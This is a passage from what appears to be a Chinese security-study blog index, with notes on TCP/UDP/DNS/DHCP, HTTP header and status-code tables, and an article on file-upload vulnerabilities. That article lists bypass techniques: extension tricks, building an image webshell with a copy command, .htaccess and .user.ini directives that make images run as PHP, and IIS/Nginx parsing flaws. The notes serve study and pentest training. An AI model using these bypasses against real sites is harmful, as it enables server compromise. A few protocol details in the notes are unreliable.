Port）为用户提供服务。\n\n\n顺序号字段：\n占32比特。用来标识从TCP源端向TCP目标端发送的数据字节流，它表示在这个报文段中的第一个数据字节。\n\n\n确认号字段：\n占32比特。只有ACK标志为1时，确认号字段才有效。它包含目标端所期望收到源端的下一个数据字节。\n\n\n头部长度字段：\n占4比特。给出头部占32比特的数目。没有任何选项字段的TCP头部长度为20字节；最多可以有60字节的TCP头部。\n\n\n标志位字段（U、A、P、R、S、F）:\n占6比特。各比特的含义如下：\n\n\nURG：\n紧急指针（urgent pointer）有效。\n\n\nACK：\n为1时，确认序号有效。\n\n\nPSH：\n为1时，接收方应该尽快将这个报文段交给应用层。\n\n\nRST：\n为1时，重建连接。\n\n\nSYN：\n为1时，同步程序，发起一个连接。\n\n\nFIN：\n为1时，发送端完成任务，释放一个连接。\n\n\n窗口大小字段：\n占16比特。此字段用来进行流量控制。单位为字节数，这个值是本机期望一次接收的字节数。\n\n\nTCP校验和字段：\n占16比特。对整个TCP报文段，即TCP头部和TCP数据进行校验和计算，并由目标端进行验证。\n\n\n紧急指针字段：\n占16比特。它是一个偏移量，和序号字段中的值相加表示紧急数据最后一个字节的序号。\n\n\n选项字段：\n占32比特。可能包括”窗口扩大因子”、”时间戳”等选项。\n\n\nTCP三握手（建立连接）\n第一次握手:\n客户端发送一个TCP的SYN标志位置1的包指明客户打算连接的服务器的端口，以及初始序号X,保存在包头的序列号(Sequence Number)字段里。\n第二次握手:\n服务器发回确认包(ACK)应答。即SYN标志位和ACK标志位均为1同时，将确认序号(Acknowledgement Number)设置为客户的I S N加1以.即X+1。\n第三次握手.\n客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK的序号字段+1,放在确定字段中发送给对方.并且在数据段放写ISN的+1\n \nTCP四挥手（释放连接）\n第一次挥手：A数据传输完毕需要断开连接，A的应用进程向其TCP发出连接释放报文段（FIN = 1,序号seq = u）,并停止再发送数据，主动关闭TCP连接，进入FIN-WAIT-1状态，等待B的确认。\n第二次挥手：B收到连接释放报文段后即发出确认报文段（ACK=1，确认号ack=u+1,序号seq=v）,B进入CLOSE-WAIT关闭等待状态,此时的TCP处于半关闭状态，A到B的连接释放。而A收到B的确认后，进入FIN-WAIT-2状态，等待B发出的连接释放报文段。\n第三次挥手：当B数据传输完毕后，B发出连接释放报文段（FIN = 1，ACK = 1，序号seq = w,确认号ack=u+1）,B进入LAST-ACK（最后确认）状态，等待A 的最后确认。\n第四次挥手：A收到B的连接释放报文段后，对此发出确认报文段（ACK = 1，seq=u+1，ack=w+1）,A进入TIME-WAIT（时间等待）状态。此时TCP未释放掉，需要经过时间等待计时器设置的时间2MSL后，A才进入CLOSE状态。\n \nUDP协议简介：\n无连接、无拥塞控制、尽最大努力交付、面向报文的传输层协议。\nUDP报文格式\n \n\n\n\n\n\n\n\n\n源端口：\n源端口号，需要对方回信时选用，不需要时全部置0.\n\n\n目的端口：\n目的端口号，在终点交付报文的时候需要用到。\n\n\n长度：\nUDP的数据报的长度（包括首部和数据）其最小值为8（只有首部）\n\n\n校验和：\n检测UDP数据报在传输中是否有错，有错则丢弃。 该字段是可选的，当源主机不想计算校验和，则直接令该字段全为0. 当传输层从IP层收到UDP数据报时，就根据首部中的目的端口，把UDP数据报通过相应的端口，上交给应用进程。 如果接收方UDP发现收到的报文中的目的端口号不正确（不存在对应端口号的应用进程0,），就丢弃该报文，并由ICMP发送“端口不可达”差错报文给对方。\n\n\nDNS协议简介：\n将域名解析到IP地址的一种协议。基于UDP和TCP协议，端口号为53，用户到服务器采用UDP，DNS服务器通信采用TCP。\n域名结构\n \n递归查询：客户机向本地DNS服务器查询发起的为递归查询。\n迭代查询：本地NDS服务器与跟等其他DNS服务器的解析过程。\nDHCP协议简介：\n动态分配IP地址，提供安全、可靠、简单的TCP/IP网络配置。协议端口：67(收)、68(发)\nDHCP原理\n1、客户机发送DHCP Discovery广播包，请求IP地址（包含客户机的MAC地址）\n2、服务器响应DHCP Offer广播包，提供IP地址（无子网掩码、网关等参数）\n3、客户机发送DHCP Request广播包，确认IP\n4、服务器发送DHCP ACK广播包，确定租约、提供网卡详细参数、IP、掩码、网关、DNS、租期等\nDHCP续约：\n租期50%过后，客户机再次发送DHCP Request包进行续约，付过服务器无响应则继续使用；\n租期87.5%租期过后，再次发送DHCP Request包进行续约，如果无响应则释放IP地址。\n之后，重新发送DHCP Discovery广播包来获取IP地址，当无任何服务器响应时，自动分配169.254.x.x/16的无效IP，用于临时的内网通信\n\n\n\n命令\n说明\n\n\n\nipconfig /release\n释放IP\n\n\nipconfig /renew\n重新获取IP\n\n\n","categories":["网络基础"],"tags":["网络协议"]},{"title":"HTTP基础","url":"/article/HTTP%E5%9F%BA%E7%A1%80/","content":"HTTP协议简介：\n超文本传输协议，80端口\n特点：\n1、支持客户端/服务器模式\n2、简单快速\n3、灵活\n4、无状态\n请求报文：\n\n\n\n\n\n\n\n\n开始行\n\n\n\n首部\n\n\n\n一个空行\n\n\n\n主体\n\n\n\n响应报文：\n\n\n\n\n\n\n\n\n状态行\nHTTP/版本 状态码 状态短语\n\n\n首部\n\n\n\n一个空行\n\n\n\n主体\n\n\n\n请求字段\n\n\n\n协议头字段名\n说明\n示例\n状态\n\n\n\nAccept\n能够接受的回应内容类型（Content-Types）\nAccept: text/plain\n常设\n\n\nAccept-Charset\n能够接受的字符集\nAccept-Charset: utf-8\n常设\n\n\nAccept-Encoding\n能够接受的编码方式列表\nAccept-Encoding: gzip, deflate\n常设\n\n\nAccept-Language\n能够接受的回应内容的自然语言列表。\nAccept-Language: en-US\n常设\n\n\nAuthorization\n用于超文本传输协议的认证的认证信息\nAuthorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\n常设\n\n\nCache-Control\n用来指定在这次的请求/响应链中的所有缓存机制都必须遵守的指令\nCache-Control: no-cache\n常设\n\n\nConnection\n该浏览器想要优先使用的连接类型\nConnection: keep-alive Connection: Upgrade\n常设\n\n\nContent-Length\n以八位字节数组 （8位的字节）表示的请求体的长度\nContent-Length: 348\n常设\n\n\nContent-Type\n请求体的格式 （用于POST和PUT请求中）\nContent-Type: application/x-www-form-urlencoded\n常设\n\n\nDate\n发送该消息的日期和时间(按照 RFC 7231 中定义的”超文本传输协议日期”格式来发送)\nDate: Tue, 15 Nov 1994 08:12:31 GMT\n常设\n\n\nExpect\n表明客户端要求服务器做出特定的行为\nExpect: 100-continue\n常设\n\n\nFrom\n发起此请求的用户的邮件地址\nFrom: user@example.com\n常设\n\n\nHost\n服务器的域名(用于虚拟主机 )，以及服务器所监听的传输控制协议端口号。如果所请求的端口是对应的服务的标准端口，则端口号可被省略。 自超文件传输协议版本1.1（HTTP/1.1）开始便是必需字段。\nHost: en.wikipedia.org:80 Host: en.wikipedia.org\n常设\n\n\nIf-Match\n仅当客户端提供的实体与服务器上对应的实体相匹配时，才进行对应的操作。主要作用时，用作像 PUT 这样的方法中，仅当从用户上次更新某个资源以来，该资源未被修改的情况下，才更新该资源。\nIf-Match: “737060cd8c284d8af7ad3082f209582d”\n常设\n\n\nIf-Modified-Since\n允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ）\nIf-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT\n常设\n\n\nIf-None-Match\n允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ）\nIf-None-Match: “737060cd8c284d8af7ad3082f209582d”\n常设\n\n\nIf-Range\n如果该实体未被修改过，则向我发送我所缺少的那一个或多个部分；否则，发送整个新的实体\nIf-Range: “737060cd8c284d8af7ad3082f209582d”\n常设\n\n\nIf-Unmodified-Since\n仅当该实体自某个特定时间已来未被修改的情况下，才发送回应。\nIf-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT\n常设\n\n\nMax-Forwards\n限制该消息可被代理及网关转发的次数。\nMax-Forwards: 10\n常设\n\n\nProxy-Authorization\n用来向代理进行认证的认证信息。\nProxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\n常设\n\n\nRange\n仅请求某个实体的一部分。字节偏移以0开始。\nRange: bytes=500-999\n常设\n\n\nReferer\n表示浏览器所访问的前一个页面，正是那个页面上的某个链接将浏览器带到了当前所请求的这个页面。\nReferer: http://en.wikipedia.org/wiki/Main_Page\n常设\n\n\nTE\n浏览器预期接受的传输编码方式：可使用回应协议头 Transfer-Encoding 字段中的值；另外还可用”trailers”（与”分块 “传输方式相关）这个值来表明浏览器希望在最后一个尺寸为0的块之后还接收到一些额外的字段。\nTE: trailers, deflate\n常设\n\n\nUser-Agent\n浏览器的身份标识字符串\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/21.0\n常设\n\n\nUpgrade\n要求服务器升级到另一个协议。\nUpgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11\n常设\n\n\nVia\n向服务器告知，这个请求是由哪些代理发出的。\nVia: 1.0 fred, 1.1 example.com (Apache/1.1)\n常设\n\n\nWarning\n一个一般性的警告，告知，在实体内容体中可能存在错误。\nWarning: 199 Miscellaneous warning\n常设\n\n\nCookie\n之前由服务器通过 Set-Cookie发送的一个超文本传输协议Cookie\nCookie: $Version=1; Skin=new;\n常设: 标准\n\n\nOrigin\n跳转来源域名（要求服务器在回应中加入一个‘访问控制-允许来源’（’Access-Control-Allow-Origin’）字段）。\nOrigin: http://www.example-social-network.com\n常设: 标准\n\n\nPragma\n与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生多种效果。\nPragma: no-cache\n常设但不常用\n\n\nContent-MD5\n请求体的内容的二进制 MD5 散列值，以 Base64 编码的结果\nContent-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==\n过时的\n\n\nAccept-Datetime\n能够接受的按照时间来表示的版本\nAccept-Datetime: Thu, 31 May 2007 20:35:00 GMT\n临时\n\n\n常见的非标准请求字段\n\n\n\n字段名\n说明\n示例\n\n\n\nX-Requested-With\n主要用于标识 Ajax 及可扩展标记语言 请求。大部分的JavaScript框架会发送这个字段，且将其值设置为 XMLHttpRequest\nX-Requested-With: XMLHttpRequest\n\n\nDNT\n请求某个网页应用程序停止跟踪某个用户。在火狐浏览器中，相当于X-Do-Not-Track协议头字段（自 Firefox/4.0 Beta 11 版开始支持）。Safari 和 Internet Explorer 9 也支持这个字段。2011年3月7日，草案提交IETF。万维网协会 的跟踪保护工作组正在就此制作一项规范。\nDNT: 1 (DNT启用) DNT: 0 (DNT被禁用)\n\n\nX-Forwarded-For\n一个事实标准 ，用于标识某个通过超文本传输协议代理或负载均衡连接到某个网页服务器的客户端的原始互联网地址\nX-Forwarded-For: client1, proxy1, proxy2 X-Forwarded-For: 129.78.138.66, 129.78.64.103\n\n\nX-Forwarded-Host\n一个事实标准 ，用于识别客户端原本发出的 Host 请求头部。\nX-Forwarded-Host: en.wikipedia.org:80 X-Forwarded-Host: en.wikipedia.org\n\n\nX-Forwarded-Proto\n一个事实标准，用于标识某个超文本传输协议请求最初所使用的协议。\nX-Forwarded-Proto: https\n\n\nFront-End-Https\n被微软的服务器和负载均衡器所使用的非标准头部字段。\nFront-End-Https: on\n\n\nX-Http-Method-Override\n请求某个网页应用程序使用该协议头字段中指定的方法（一般是PUT或DELETE）来覆盖掉在请求中所指定的方法（一般是POST）。当某个浏览器或防火墙阻止直接发送PUT 或DELETE 方法时（注意，这可能是因为软件中的某个漏洞，因而需要修复，也可能是因为某个配置选项就是如此要求的，因而不应当设法绕过），可使用这种方式。\nX-HTTP-Method-Override: DELETE\n\n\nX-ATT-DeviceId\n使服务器更容易解读AT&amp;T设备User-Agent字段中常见的设备型号、固件信息。\nX-Att-Deviceid: GT-P7320/P7320XXLPG\n\n\nX-Wap-Profile\n链接到互联网上的一个XML文件，其完整、仔细地描述了正在连接的设备。右侧以为AT&amp;T Samsung Galaxy S2提供的XML文件为例。\nx-wap-profile: http://wap.samsungmobile.com/uaprof/SGH-I777.xml\n\n\nProxy-Connection\n该字段源于早期超文本传输协议版本实现中的错误。与标准的连接（Connection）字段的功能完全相同。\nProxy-Connection: keep-alive\n\n\nX-Csrf-Token\n用于防止 跨站请求伪造。 辅助用的头部有 X-CSRFToken或 X-XSRF-TOKEN\nX-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql\n\n\n响应字段\n\n\n\n字段名\n说明\n例子\n状态\n\n\n\nAccept-Patch\n指定服务器支持的文件格式类型。\nAccept-Patch: text/example;charset=utf-8\n常设\n\n\nAccept-Ranges\n这个服务器支持哪些种类的部分内容范围\nAccept-Ranges: bytes\n常设\n\n\nAge\n这个对象在代理缓存中存在的时间，以秒为单位\nAge: 12\n常设\n\n\nAllow\n对于特定资源有效的动作。针对HTTP/405这一错误代码而使用\nAllow: GET, HEAD\n常设\n\n\nCache-Control\n向从服务器直到客户端在内的所有缓存机制告知，它们是否可以缓存这个对象。其单位为秒\nCache-Control: max-age=3600\n常设\n\n\nConnection\n针对该连接所预期的选项\nConnection: close\n常设\n\n\nContent-Disposition\n一个可以让客户端下载文件并建议文件名的头部。文件名需要用双引号包裹。\nContent-Disposition: attachment; filename=”fname.ext”\n常设\n\n\nContent-Encoding\n在数据上使用的编码类型。参考 超文本传输协议压缩 。\nContent-Encoding: gzip\n常设\n\n\nContent-Language\n内容所使用的语言\nContent-Language: da\n常设\n\n\nContent-Length\n回应消息体的长度，以字节（8位为一字节）为单位\nContent-Length: 348\n常设\n\n\nContent-Location\n所返回的数据的一个候选位置\nContent-Location: /index.htm\n常设\n\n\nContent-Range\n这条部分消息是属于某条完整消息的哪个部分\nContent-Range: bytes 21010-47021/47022\n常设\n\n\nContent-Type\n当前内容的MIME类型\nContent-Type: text/html; charset=utf-8\n常设\n\n\nDate\n此条消息被发送时的日期和时间(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)\nDate: Tue, 15 Nov 1994 08:12:31 GMT\n常设\n\n\nETag\n对于某个资源的某个特定版本的一个标识符，通常是一个 消息散列\nETag: “737060cd8c284d8af7ad3082f209582d”\n常设\n\n\nLast-Modified\n所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)\nLast-Modified: Tue, 15 Nov 1994 12:45:26 GMT\n常设\n\n\nLink\n用来表达与另一个资源之间的类型关系，此处所说的类型关系是在 RFC 5988 中定义的\nLink: ; rel=”alternate”\n常设\n\n\nLocation\n用来进行重定向，或者在创建了某个新资源时使用。\nLocation: http://www.w3.org/pub/WWW/People.html\n常设\n\n\nP3P\n用于支持设置P3P策略，标准格式为“P3P:CP=”your_compact_policy””。然而P3P规范并不成功，大部分现代浏览器没有完整实现该功能，而大量网站也将该值设为假值，从而足以用来欺骗浏览器的P3P插件功能并授权给第三方Cookies。\nP3P: CP=”This is not a P3P policy! See http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;answer=151657 for more info.”\n常设\n\n\nPragma\n与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生多种效果。\nPragma: no-cache\n常设\n\n\nProxy-Authenticate\n要求在访问代理时提供身份认证信息。\nProxy-Authenticate: Basic\n常设\n\n\nPublic-Key-Pins\n用于缓解中间人攻击，声明网站认证使用的传输层安全协议证书的散列值\nPublic-Key-Pins: max-age=2592000; pin-sha256=”E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=”;\n常设\n\n\nRetry-After\n如果某个实体临时不可用，则，此协议头用来告知客户端日后重试。其值可以是一个特定的时间段(以秒为单位)或一个超文本传输协议日期。\nExample 1: Retry-After: 120 Example 2: Retry-After: Fri, 07 Nov 2014 23:59:59 GMT\n常设\n\n\nServer\n服务器的名字\nServer: Apache/2.4.1 (Unix)\n常设\n\n\nTrailer\n这个头部数值指示了在这一系列头部信息由由分块传输编码编码。\nTrailer: Max-Forwards\n常设\n\n\nTransfer-Encoding\n用来将实体安全地传输给用户的编码形式。当前定义的方法包括：分块（chunked）、compress、deflate、gzip和identity。\nTransfer-Encoding: chunked\n常设\n\n\nUpgrade\n要求客户端升级到另一个协议。\nUpgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11\n常设\n\n\nVary\n告知下游的代理服务器，应当如何对未来的请求协议头进行匹配，以决定是否可使用已缓存的回应内容而不是重新从原始服务器请求新的内容。\nVary: *\n常设\n\n\nVia\n告知代理服务器的客户端，当前回应是通过什么途径发送的。\nVia: 1.0 fred, 1.1 example.com (Apache/1.1)\n常设\n\n\nWarning\n一般性的警告，告知在实体内容体中可能存在错误。\nWarning: 199 Miscellaneous warning\n常设\n\n\nWWW-Authenticate\n表明在请求获取这个实体时应当使用的认证模式。\nWWW-Authenticate: Basic\n常设\n\n\nExpires\n指定一个日期/时间，超过该时间则认为此回应已经过期\nExpires: Thu, 01 Dec 1994 16:00:00 GMT\n常设: 标准\n\n\nSet-Cookie\nHTTP cookie\nSet-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1\n常设: 标准\n\n\nStrict-Transport-Security\nHTTP 严格传输安全这一头部告知客户端缓存这一强制 HTTPS 策略的时间，以及这一策略是否适用于其子域名。\nStrict-Transport-Security: max-age=16070400; includeSubDomains\n常设: 标准\n\n\nContent-MD5\n回应内容的二进制 MD5 散列，以 Base64 方式编码\nContent-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==\n过时的\n\n\nX-Frame-Options\n点击劫持保护： deny：该页面不允许在 frame 中展示，即使是同域名内。 sameorigin：该页面允许同域名内在 frame 中展示。 allow-from uri：该页面允许在指定uri的 frame 中展示。 allowall：允许任意位置的frame显示，非标准值。\nX-Frame-Options: deny\n过时的\n\n\nAccess-Control-Allow-Origin\n指定哪些网站可参与到跨来源资源共享过程中\nAccess-Control-Allow-Origin: *\n临时\n\n\nRefresh\n用于设定可定时的重定向跳转。右边例子设定了5秒后跳转至“http://www.w3.org/pub/WWW/People.html”。\nRefresh: 5; url=http://www.w3.org/pub/WWW/People.html\n专利并非标准 Netscape实现的扩展，但大部分网页浏览器也支持。\n\n\nStatus\n通用网关接口 协议头字段，用来说明当前这个超文本传输协议回应的 状态 。普通的超文本传输协议回应，会使用单独的“状态行”（”Status-Line”）作为替代，这一点是在 RFC 7230 中定义的。\nStatus: 200 OK\nNot listed as a registered field name\n\n\n常见的非标准回应字段\n\n\n\n字段名\n说明\n示例\n\n\n\nX-XSS-Protection\n跨站脚本攻击 （XSS）过滤器\nX-XSS-Protection: 1; mode=block\n\n\nContent-Security-Policy, X-Content-Security-Policy, X-WebKit-CSP\n内容安全策略定义。\nX-WebKit-CSP: default-src ‘self’\n\n\nX-Content-Type-Options\n唯一允许的数值为”nosniff”，防止 Internet Explorer 对文件进行MIME类型嗅探。这也对 Google Chrome 下载扩展时适用。\nX-Content-Type-Options: nosniff\n\n\nX-Powered-By\n表明用于支持当前网页应用程序的技术（例如：PHP）（版本号细节通常放置在 X-Runtime 或 X-Version 中）\nX-Powered-By: PHP/5.4.0\n\n\nX-UA-Compatible\n推荐指定的渲染引擎（通常是向后兼容模式）来显示内容。也用于激活 Internet Explorer 中的 Chrome Frame。\nX-UA-Compatible: IE=EmulateIE7 X-UA-Compatible: IE=edge X-UA-Compatible: Chrome=1\n\n\nX-Content-Duration\n指出音视频的长度，单位为秒。只受Gecko内核浏览器支持。\nX-Content-Duration: 42.666\n\n\nFeature-Policy\n管控特定应用程序接口\nFeature-Policy: vibrate ‘none’; geolocation ‘none’\n\n\nPermissions-Policy\n管控特定应用程序接口为W3C标准 替代Feature-Policy\nPermissions-Policy: microphone=(),geolocation=(),camera=()\n\n\nX-Permitted-Cross-Domain-Policies\nFlash的跨网站攻击防御\nX-Permitted-Cross-Domain-Policies: none\n\n\nReferrer-Policy\n保护信息泄漏\nReferrer-Policy: origin-when-cross-origin\n\n\nExpect-CT\n防止欺骗 SSL，单位为秒\nExpect-CT: max-age=31536000, enforce\n\n\nX-Forwarder-For\n60.12.15.50(出口ip) -&gt;45.67.45.32(代理ip) -&gt; 1114.114.114.114(目的ip)\nX-Forwarder-For： 60.12.15.50,45.67.45.32(可伪造，进行SQL注入)\nCLIENT_IP: 60.12.15.50\nREMOTE_IP: 45.67.45.32\nHTTP响应码\n\n\n\n状态码\n状态码英文名称\n中文描述\n\n\n\n1**\n\n信息，服务器收到请求，需要请求者继续执行操作\n\n\n100\nContinue\n继续。客户端应继续其请求\n\n\n101\nSwitching Protocols\n切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议\n\n\n\n\n\n\n\n2**\n\n成功，操作被成功接收并处理\n\n\n200\nOK\n请求成功。一般用于GET与POST请求\n\n\n201\nCreated\n已创建。成功请求并创建了新的资源\n\n\n202\nAccepted\n已接受。已经接受请求，但未处理完成\n\n\n203\nNon-Authoritative Information\n非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本\n\n\n204\nNo Content\n无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档\n\n\n205\nReset Content\n重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域\n\n\n206\nPartial Content\n部分内容。服务器成功处理了部分GET请求\n\n\n\n\n\n\n\n3**\n\n重定向，需要进一步的操作以完成请求\n\n\n300\nMultiple Choices\n多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择\n\n\n301\nMoved Permanently\n永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替\n\n\n302\nFound\n临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI\n\n\n303\nSee Other\n查看其它地址。与301类似。使用GET和POST请求查看\n\n\n304\nNot Modified\n未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源\n\n\n305\nUse Proxy\n使用代理。所请求的资源必须通过代理访问\n\n\n306\nUnused\n已经被废弃的HTTP状态码\n\n\n307\nTemporary Redirect\n临时重定向。与302类似。使用GET请求重定向\n\n\n\n\n\n\n\n4**\n\n客户端错误，请求包含语法错误或无法完成请求\n\n\n400\nBad Request\n客户端请求的语法错误，服务器无法理解\n\n\n401\nUnauthorized\n请求要求用户的身份认证\n\n\n402\nPayment Required\n保留，将来使用\n\n\n403\nForbidden\n服务器理解请求客户端的请求，但是拒绝执行此请求（文件夹是存在的）\n\n\n404\nNot Found\n服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面（客户端请求文件或文件夹不存在）\n\n\n405\nMethod Not Allowed\n客户端请求中的方法被禁止\n\n\n406\nNot Acceptable\n服务器无法根据客户端请求的内容特性完成请求\n\n\n407\nProxy Authentication Required\n请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权\n\n\n408\nRequest Time-out\n服务器等待客户端发送的请求时间过长，超时\n\n\n409\nConflict\n服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突\n\n\n410\nGone\n客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置\n\n\n411\nLength Required\n服务器无法处理客户端发送的不带Content-Length的请求信息\n\n\n412\nPrecondition Failed\n客户端请求信息的先决条件错误\n\n\n413\nRequest Entity Too Large\n由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息\n\n\n414\nRequest-URI Too Large\n请求的URI过长（URI通常为网址），服务器无法处理\n\n\n415\nUnsupported Media Type\n服务器无法处理请求附带的媒体格式\n\n\n416\nRequested range not satisfiable\n客户端请求的范围无效\n\n\n417\nExpectation Failed\n服务器无法满足Expect的请求头信息\n\n\n\n\n\n\n\n5**\n\n服务器错误，服务器在处理请求的过程中发生了错误\n\n\n500\nInternal Server Error\n服务器内部错误，无法完成请求\n\n\n501\nNot Implemented\n服务器不支持请求的功能，无法完成请求\n\n\n502\nBad Gateway\n作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应\n\n\n503\nService Unavailable\n由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中\n\n\n504\nGateway Time-out\n充当网关或代理的服务器，未及时从远端服务器获取请求\n\n\n505\nHTTP Version not supported\n服务器不支持请求的HTTP协议的版本，无法完成处理\n\n\n","categories":["网络基础"],"tags":["HTTP"]},{"title":"文件上传漏洞","url":"/article/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","content":"一、漏洞原理1、未过滤或web前端过滤被绕过\n2、文件检测被绕过\n3、中间件解析\n4、不完善的黑名单拓展名\n5、文件路径截断\n6、HTTP不安全方法（PUT协议）\n二、漏洞触发点\n\n\n说明\n\n\n\n\n存在漏洞的网站类型\n存在文件上传功能的网站皆有可能出现文件上传漏洞\n\n\n常见存在漏洞的位置\n头像、相册上传 ；视频、照片分享 ；论坛发帖、留言、邮箱附件上传 ；添加文章图片 ；编辑器文件上传 ；后台添加模板等\n\n\n三、利用条件1、服务器开启文件上传功能\n2、用户对目录拥有读写权限、执行权限\n3、web容器可以以指定格式解析上传的文件（如php站点以php方式解析任意含马文件）\n4、服务器配置不当（开启PUT方法）\n使用前提\n1、文件名后缀必须符合当前网站的开发语言类型\n2、确保内容正确，有且只有一个语法标签，如\n3、知道文件路径\n文件上传漏洞分类\n\n\n\n类型\n说明\n\n\n\n任意文件上传\n无限制\n\n\n前端限制\njs、标签等\n\n\n后端限制\n文件名后缀 MIME-type类型 文件内容\n\n\n解析漏洞\niis、nginx、apache、tomcat\n\n\n其他类型\n00截断、put截断、修改模板等\n\n\n判断操作系统类型\n选择图片路径，改大小写，访问成功为windows、失败为linux\n四、绕过方式\n\n\nwaf类型\n说明\n方法\n\n\n\n前端验 证\n上传.xxx文件，抓包，若未抓包边被拦截，即为前段验证。\n1、禁用js（不推荐） 2、bp抓包改文件名后缀\n\n\n\n\n\n\n\n后端验证\n分别修改文件名后缀、文件类型和文件内容，观察哪一次修改被拦截，即为哪种验证\n\n\n\n文件类型检测\nMIME，描述消息内容类型的因特网标准 Content-Type： .js -&gt; application/x-javascript .html -&gt; text/html .jpg -&gt; image/jpeg * .png -&gt; image/png .pdf -&gt; application/pdf\n常用类型：image/jpeg\n\n\n后缀名检测\n黑白名单 上传.xxx文件，通过即为黑名单，不通过为白名单 常见黑名单后缀 php：”.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”, jsp：”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”, asp：”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,,”.cEr”,”.sWf”,”.swf”\n黑名单绕过 1、大小写绕过 linux中，centos6搭载默认apache2.2时可绕过 windows可以绕过  2、黑名单不全绕过 php：.php3、.phtml asp：.cer、.asmx  3、windows系统特性绕过 a.php. a.php (空格) a.php:1 a.php::$DATA\n\n\n内容检测\n会检测图片流数据前n位，判断文件类型、大小等。\n制作图片马。最好选择不含PHP、ASP、ASP等标签的图片 如果有，需要手动剔除 copy 1.jpg /b + 2.txt /a 3.jpg 将2中内容追加到1中，生成3 2中可同时写入多种一句话\n\n\n\n\n\n\n\n解析漏洞\n1、Apache解析漏洞 &gt;多后缀 apache解析顺序从右到左，若是无法解析，则返回源码。 前提：apache1.x、2.xApache能够识别的文件在mime.types文件可以查看 形式： a.php.xxx.yyy绕过（黑名单绕过） a.php.7z（可绕过白名单–不在apache解析目录，但是在白名单目录） &gt;配置错误 apache配置文件可指定解析后缀类型 &gt;.htaccess apache环境下，当上传文件未拦截.htaccess且未重命名文件时，可上传.htaccess修改apache默认配置  2、IIS6.0解析漏洞 &gt;目录解析 形式：/xx.asp/xx.jpg 原理：在网站下创建文件夹名字为.asp、.asa的文件夹，其目录内的任何扩展名的文件都被当作asp文件来解析并执行。 &gt;文件解析 形式：/xx.asp;.jpg（利用特殊符号”;”）原理：在iis6.0下，服务器默认不解析；号后面的内容，所以xx.asp;.jpg被解析为asp脚本解析漏洞 &gt;解析文件类型（属于黑名单绕过方式） 形式：/test.asa、/test.cer、/test.cdx 原理：iis6.0默认的可执行文件除了asp还包含这三种asa、cer、cdx，会将这三种扩展名文件解析为asp文件  3、PHP CGI解析漏洞 IIS7.0/IIS7.5/Nginx&lt;0.8.3畸形解析漏洞 前提： 1、Fast-CGI运行模式 2、php.ini里cgi.fix_pathinfo=1(默认为1) 3、取消勾选php-cgi.exe程序的”Invoke handler only if request is mapped to” 形式：将/xx.jpg/xx.php解析为php文件 4、Nginx解析漏洞 影响版本：0.5，0.6，0.7&lt;=0.7.65，0.8&lt;=0.8.37 原理：在使用PHP-FastCGI执行php的时候，URL里面在遇到%00空字节时与FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码 形式：xxx.jpg%00.php\n&gt;配置错误 AddHandler php5-script .php、AddType application/x-httpd-php .jpg &gt;.htaccess AddType application/x-httpd-php xxx 使用php解析.xxx文件 或 &lt;FilesMatch .ccc$&gt; SetHandler application/x-httpd-php 正则匹配.ccc后缀文件 或 &lt;FilesMatch “shell.jpg”&gt; SetHandler application/x-httpd-php 指定解析某个文件\n\n\n\n\n\n\n\n其他类型\n\n\n\n\n.user.ini\n自动文件包含，可将jpg解析为php文件，包含于php文件首部，只适用于PHP，7.3版本可用，类似于Apache配置文件.htaccess注意：文件夹下必须有php文件才可生效\nauto_prepend_file=x.jpg 